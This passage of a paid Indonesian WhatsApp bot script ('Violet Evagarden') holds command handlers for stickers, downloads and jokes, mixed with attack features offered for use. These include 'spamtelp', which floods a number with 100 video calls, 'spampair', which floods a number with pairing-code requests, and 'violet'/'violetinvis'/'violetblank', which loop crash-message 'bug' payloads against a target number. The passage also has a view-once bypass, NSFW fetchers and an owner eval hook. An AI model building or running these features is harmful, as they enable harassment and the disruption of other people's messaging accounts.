                        title: "𝐕𝐢𝐨𝐥𝐞𝐭 𝐄𝐯𝐚𝐠𝐚𝐫𝐝𝐞𝐧",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", description: "© ᴀɴᴅʀɪ sᴛᴏʀᴇ", id: `.owner` }, 
                            { title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", description: "Support", id: `.tqto` }   
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await reo.sendMessage(m.chat, buttonMessage, { quoted: lol });  
   await reo.sendMessage(m.chat, { audio: fs.readFileSync('./image/violet.mp3'), mimetype: 'audio/mpeg', ptt: true }, { quoted: qtext });     
}
break;

case "owner": {
await reo.sendMessage(m.chat, { react: { text: "⚡",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/foto2.jpg") }, { upload: reo.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: ` `,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Developer Violet Evagarden*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp Andri store\",\"url\":\"https://wa.me/6281371379077\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram Andri store\",\"url\":\"https://t.me/Androstore022\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Violet Evagarden\",\"url\":\"https://whatsapp.com/channel/0029VbBBPQvD8SDsMDyM8V0v\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: lol})
await reo.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break

case 'sc': {
let teks = `
Hai Bro, suka dengan script ini? ,kalo ingin membeli silahkan hubungi Contact developer di bawah

       ⸙ 𝐕𝐈𝐎𝐋𝐄𝐓 𝐄𝐕𝐀𝐆𝐀𝐑𝐃𝐄𝐍

PRICE LIST SCRIPT =
• Violet Evagarden No Enc : 45.000 IDR Full Update.
• Violet Evagarden No Enc : 35.000 IDR Update 2x.
• Violet Evagarden Enc : Free 

Thanks For You Buy Script 🚀
` 
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© Violet Evagarden Free"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Kontak Andri store\",\"url\":\"https://wa.me/6281371379077\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Kontak Andri store 2\",\"url\":\"https://wa.me/62895404693363\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Information Script\",\"url\":\"https://whatsapp.com/channel/0029VbBBPQvD8SDsMDyM8V0v\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: lol}) 
await reo.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})	
}   
break

case 'cekidch': {
 if (!text) return Reply(`Example: ${prefix + command} <Link Channel>`)
 if (!text.includes("https://whatsapp.com/channel/")) return Reply("Link tautan tidak valid")

 let result = text.split('https://whatsapp.com/channel/')[1]
 let res = await reo.newsletterMetadata("invite", result)
 
 let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *IdCh :* ${res.id}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: { 
 "messageContextInfo": { 
 "deviceListMetadata": {}, 
 "deviceListMetadataVersion": 2 
 },
 interactiveMessage: {
 body: {
 text: teks 
 }, 
 footer: {
 text: `© Violet Evagarden`
 },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
 },
 ]
 }
 }
 }
 }
 }, { quoted: lol }); // Menambahkan {quoted: qmime} di sini
 await reo.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
break

case 'brat': {
    if (!text) return Reply('Masukkan teks setelah perintah .brat <text>');
    let apiUrl = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`;
    try {
        let file = await getFile(apiUrl); // Ambil gambar dari API
        if (!file) return Reply('Gagal mengambil gambar dari API.');
        let sticker = await reo.sendMessage(m.chat, { 
            sticker: { url: file.data }, 
            packname: global.packname, // Nama paket stiker
            author: global.author, // Nama pembuat stiker
            mimetype: 'image/webp'
        }, { quoted: lol });
        if (!sticker) Reply('Gagal mengirim stiker');
        // Hapus file setelah dikirim
        fs.unlinkSync(file.data);
    } catch (e) {
        console.error(e);
        Reply('Terjadi kesalahan, coba lagi nanti.');
    }
}
break

case 'qc': {
  if (!q) return Reply(`Send command with text. ${prefix + command} violet Suka Cewek Tobrut`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await reo.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  reo.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return Reply("Reply foto yang mau di rvo");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return Reply("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return Reply("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await reo.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await reo.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await reo.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break

		case 'hentaineko':

 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
reo.sendMessage(m.chat, { caption: "sangean lu jir....", image: { url:waifudd2.data.url } }, { quoted: m })
break
        	case 'nsfw': {
        	Reply(`Prosess Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			reo.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break
//====================[ CASE BUG GROUP ]===========================//
case 'bug-group': {
    if (!isPremium && !isOwner && !isUnli) return Reply(`Khusus Owner`);
    if (!text) return Reply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return Reply('invalid group link');

        try {
            let isTarget = await reo.groupAcceptInvite(groupId);
            Reply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            
           }
        } catch (err) {
            return Reply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        Reply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            
        }
    }
}
break;

//SPAM CALL                                
async function sendOfferVideoCall(target) {
    try {
        await reo.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
      
 case 'stelp':          
 case 'spamtelp': { // SPAM TELP
if (!isOwner && !isPremium && !isUnli) return Reply(`[Akses Di Tolak], Fitur ini Khusus Owner`) 
if (!q) {
Reply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = '6283891457614@s.whatsapp.net';
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return Reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
if (target === blockedNum) {
	Reply('*Developernya seleb kocak, gabakal diangkat telp gw..*');
	} else {
await reo.sendMessage(m.chat, { react: { text: "📲",key: m.key,}}),
await sleep(1500)
await reo.sendMessage(m.chat, { react: { text: "🎉",key: m.key,}}); 
            Reply(`*Succes spam call to target ${pepec}*`) 
            reo.sendMessage(target, {text: `halo mass`});
for (let i = 0; i < 100; i++) {
sendOfferVideoCall(target)

await sleep(2000)
}            
 reo.sendMessage(target, {text: `halo mass`});
}
}
    }
break   

//SPAM PAIR
case 'spampair': {
if (!isOwner) return Reply(`[Akses Di Tolak], Fitur ini Khusus Owner`) 
if (!text) return Reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
Reply('proses bro...')
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
    
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "cekganteng": {
if (!args[0]) return Reply('NAMA LU MANA??')
const ganteng = [
"cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet","80% gantengggg parah","90% Ganteng idaman ciwi ciwi","100% Ganteng Bgt bjirr"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
Reply(teks)
}
break         

case 'cekkhodam': case 'cekkodam': {
if (!text) return Reply('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"pecel lele",
"kumis lele",
"Ambatron",
"Ambatukam",
"Kacang Hijau",
"Kulkas mini",
"Burung beo",
"Air",
"Api",
"Batu",
"Magnet",
"Sempak",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"sungut lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Bjorka",
"Hacker",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak",
"Aromanis",
"Gelembung sabun",
"Kuda",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"@whiskeysockets/baileys",
"chalk",
"gradient-string",
"@adiwajshing",
"d-scrape",
"undefined",
"cannot read properties",
"performance-now",
"os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Ternyata Khodam ${text} adalah:* ${kdm}`
  Reply(kodamn)
}
break  

        case 'addakses':

if (!isOwner) return 
if (!m.isGroup) return Reply("Lakukan Didalem Grup!")
if (!isOwner) return Reply("[Akses Di Tolak],Fitur khusus owner")
unli.push(m.chat)
fs.writeFileSync('./database/unli.json', JSON.stringify(unli))
Reply(`Seluruh Member Grup, Sudah Dapat Mengakses Bot Violet Evagarden!`)
break
case "delakses":{
  
if (!m.isGroup) return Reply("Lakukan Didalam Grup!")
if (!isOwner) return Reply("[Akses Di Tolak],Fitur khusus owner")
unli.splice(m.chat)
fs.writeFileSync("./database/unli.json", JSON.stringify(unli))
Reply(`Seluruh Member Grup Kini Tidak Dapat Mengakses Bot, Silahkan Chat Owner Bot Untuk Membeli Akses!`)
}
break

      case "reactch":
      case "spamreact": {
if (!isOwner) return Reply('[Akses Di Tolak], Khusus Owner')
if (!q) return Reply(".reactch linkpesan 😂")
if (!args[0] || !args[1]) return Reply("Wrong Format")
if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await reo.newsletterMetadata("invite", result)
await reo.newsletterReactMessage(res.id, serverId, args[1])
Reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break;   

  case 'sertifikattolol': {
if (args.length === 0) {
await reo.sendMessage(m.chat, { text: "❗ Silakan masukkan teks untuk sertifikat.\n\nContoh: *.tolol Jamaluddin*" }, { quoted: m });
break; }
const text = args.join(" ");
const imageUrl = `https://api.siputzx.my.id/api/m/sertifikat-tolol?text=${encodeURIComponent(text)}`;
try {
await reo.sendMessage(m.chat, { 
image: { url: imageUrl }, // Kirim langsung pakai URL gambar
caption: `🖼️ *Sertifikat Tolol Untuk ${text}*`
}, { quoted: m });
} catch (error) {
console.error("Error mengambil gambar:", error.message);
await reo.sendMessage(m.chat, { text: "❌ Gagal mengambil gambar. Pastikan API aktif atau coba lagi nanti!" }, { quoted: m })}
break; }

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return Reply(example("url"))
await tiktokDl(q).then(async (result) => {
await reo.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return Reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: reo.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Sukses*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await reo.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await reo.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Sukses*`}, {quoted: m})
}
}).catch(e => console.log(e))
await reo.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "addowner": case "addown": {
if (!isOwner) return Reply(msg.owner)
if (m.quoted || text) {
if (text == "all") {
return Reply(`*Gunakan format: @tag/6283XXX*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!orang) return Reply(`*Nomor tidak valid*`)
if (owner2.includes(orang) || orang == global.owner) return necroxenreply(`Nomor ${orang.split("@")[0]} Sudah Ada Di Database Owner`)
if (orang == botNumber) return necroxenreply("Tidak Bisa Menambahkan Nomor Bot!")
await owner2.push(orang)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
Reply(`*Berhasil Menambahkan Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Ditambahkan Ke Database Owner`)
} else {
Reply(example("@tag/6283XXX"))
}
}
break        
        
        
        
case "delowner": case "delown": {
if (!isOwner) return Reply(msg.owner)
if (m.quoted || text) {
if (text == "all") {
await fs.writeFileSync("./database/owner.json", "[]")
return Reply(`*Berhasil Menghapus Semua Owner Tambahan ✅*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!owner2.includes(orang) || orang == global.owner) return necroxenreply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
if (orang == botNumber) return necroxenreply("Tidak Bisa Menghapus Nomor Bot!")
let pos = owner2.indexOf(orang)
await owner2.splice(pos, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
Reply(`*Berhasil Menghapus Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database Owner`)
} else {
Reply(example("@tag/6283XXX"))
}
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "addmurbug": case "addpremium": {
if (!isOwner) return Reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (premium.includes(orang)) return necroxenreply(`*Gagal Menambah User Premium!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *User Premium*`)
await premium.push(orang)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
Reply(`*Berhasil Menambah Premium ✅*\n${orang.split('@')[0]} Sekarang Terdaftar Di Database *User Premium*`)
} else {
return Reply(example("@tag/62838XXX"))
}}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "delmurbug": case "delpremium": {
if (!isOwner) return Reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!premium.includes(orang)) return Reply(`*Gagal Menghapus User Premium!*\n${orang.split('@')[0]} Tidak Terdaftar Di Database *User Premium*`)
let indx = premium.indexOf(orang)
await premium.splice(indx, 1)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
Reply(`*Berhasil Menghapus Premium ✅*\n${orang.split('@')[0]} Sekarang Terhapus Dari Database *User Premium*`)
} else {
return Reply(example("@tag/62838XXX"))
}}
break

case 'play': {
  if (!text) return Reply(example('.play dj tiktok'))

  // react search
  await reo.sendMessage(m.chat, {
    react: { text: '🔎', key: m.key }
  })

  try {
    const res = await axios.get(
      `https://api.vreden.my.id/api/v1/download/play/audio?query=${encodeURIComponent(text)}`,
      { timeout: 20000 }
    )

    const anu = res.data
    if (!anu || !anu.status || !anu.result || !anu.result.download) {
      return Reply('❌ Lagu tidak ditemukan.')
    }

    const meta = anu.result.metadata
    const down = anu.result.download

    // kirim thumbnail + info
    await reo.sendMessage(
      m.chat,
      {
        image: { url: meta.image },
        caption:
`🎶 *PLAY RESULT*

📌 *Title* : ${meta.title}
👤 *Author* : ${meta.author?.name || 'Unknown'}
⏱️ *Duration* : ${meta.duration?.timestamp || '-'}
👁️ *Views* : ${meta.views || '-'}
📅 *Uploaded* : ${meta.ago || '-'}

🔗 ${meta.url}`
      },
      { quoted: m }
    )

    // kirim audio
    await reo.sendMessage(
      m.chat,
      {
        audio: { url: down.url },
        mimetype: 'audio/mpeg',
        fileName: down.filename || `${meta.title}.mp3`
      },
      { quoted: m }
    )

  } catch (err) {
    console.error('[PLAY ERROR]', err)
    Reply('⚠️ Terjadi error saat memproses lagu.')
  }

  // hapus react
  await reo.sendMessage(m.chat, {
    react: { text: '', key: m.key }
  })
}
break
//---------------------------------//
case "self": {
if (!isOwner) return
reo.public = false
Reply("Berhasil mengganti ke mode *self*")
}
break
  
case "public": {
if (!isOwner) return
reo.public = true
Reply("Berhasil mengganti ke mode *public*")
}
break
    
    
          
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case 'tourl': {
  try {
    const qmsg = m.quoted ? m.quoted : m

    if (!qmsg.mtype || !/imageMessage|videoMessage|audioMessage/.test(qmsg.mtype)) {
      return Reply(`⚡︎ Reply atau kirim gambar / video / audio dengan caption *${prefix + command}*`)
    }

    // ambil buffer
    const buffer = await qmsg.download()

    // tentukan ekstensi dari mime
    let ext = '.bin'
    if (qmsg.mtype === 'imageMessage') ext = '.jpg'
    if (qmsg.mtype === 'videoMessage') ext = '.mp4'
    if (qmsg.mtype === 'audioMessage') ext = '.mp3'

    const filePath = path.join(tempDir, `tourl-${Date.now()}${ext}`)
    fs.writeFileSync(filePath, buffer)

    // upload ke catbox
    const url = await CatBox(filePath)
    const fileSize = (fs.statSync(filePath).size / 1024).toFixed(2)

    await reo.sendMessage(
      m.chat,
      {
        text: `*UPLOAD BERHASIL ✅*

📦 Ukuran : ${fileSize} KB
👤 Pengunggah : ${pushname}
🔗 URL :
${url}`
      },
      { quoted: m }
    )

    fs.unlinkSync(filePath)
  } catch (err) {
    console.error('[TOURL ERROR]', err)
    Reply('⚡︎ Gagal mengunggah file ke server.')
  }
}
break


    

  case "tqto": {
    await reo.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
    await reo.sendMessage(m.chat, {react: {text: '🖕', key: m.key}})
    await reo.sendMessage(m.chat, {react: {text: '🦠', key: m.key}})
    await reo.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
    
    let rex = 
`Hola ${pushname}👋, Saya ${global.namabot} Siap Membantu Anda. Apakah Bos Butuh Bantuan? Silahkan Pilih Menu di Bawah.

╔═══════════════════
║ *𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓*
║➣ *Nama Bot*: ${global.namabot}
║➣ *Version*: 1.0
║➣ *Developer*: ${global.namaowner}
║➣ *Library*: @whiskeysockets/baileys
║➣ *Runtime*: ${runtime(process.uptime())}
╚═══════════════════

╔═══════════════════
║ *𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎*
║➣ Allah SWT - Yang Maha Kuasa
║➣ Orang Tua - Dukungan Terbaik
║➣ Developer - Pembuat Script ini
║➣Pengguna - Motivasi Utama
╚═══════════════════`

    // Button Developer
    let buttons = [
        {buttonId: '.owner', buttonText: {displayText: 'DEVELOPER'}, type: 1},
        {buttonId: '.sc', buttonText: {displayText: 'Buy Script'}, type: 1},
        {buttonId: '.menu', buttonText: {displayText: 'Semua Menu'}, type: 1}
    ]

    let buttonMessage = {
        text: rex,
        footer: `© ${global.namabot} ${new Date().getFullYear()}`,
        buttons: buttons,
        headerType: 1
    }

    await reo.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break








//============ CASE BUG ============//

case 'violetinvis': {
if (!isPremium && !isOwner) return payreply(`Akses Di Tolak Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(` Berhasil mengirim bug Ke target ${target}
Type : ${command}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await blnkmark(target);
await blnkmark(target);   
await LocationXz(reo, target);
await LocationXz(reo, target); 
await RizzXstecu(reo, target);
await RizzXstecu(reo, target);    
}
}
break
        
case 'violet': {
if (!isPremium && !isOwner) return payreply(`Akses Di Tolak Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(` Berhasil mengirim bug Ke target ${target}
Type : ${command}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await RizzXstecu(reo, target);
await RizzXstecu(reo, target);   
await VirtezzRizzX(target, reo);
await VirtezzRizzX(target, reo);
}
}
break        
        
case 'violetblank': {
if (!isPremium && !isOwner) return payreply(`Akses Di Tolak Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(` Berhasil mengirim bug Ke target ${target}
Type : ${command}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await InvisRizzX(target, reo);
await InvisRizzX(target, reo);
}
}
break                
 
        
        
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (m.text.toLowerCase() == "bot") {
   Reply(`*Violet Evagarden V1 ON!!*`)
}
if (m.text.toLowerCase() == "tes") {
   Reply(`*Violet Evagarden V1 ON*`)
}


if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
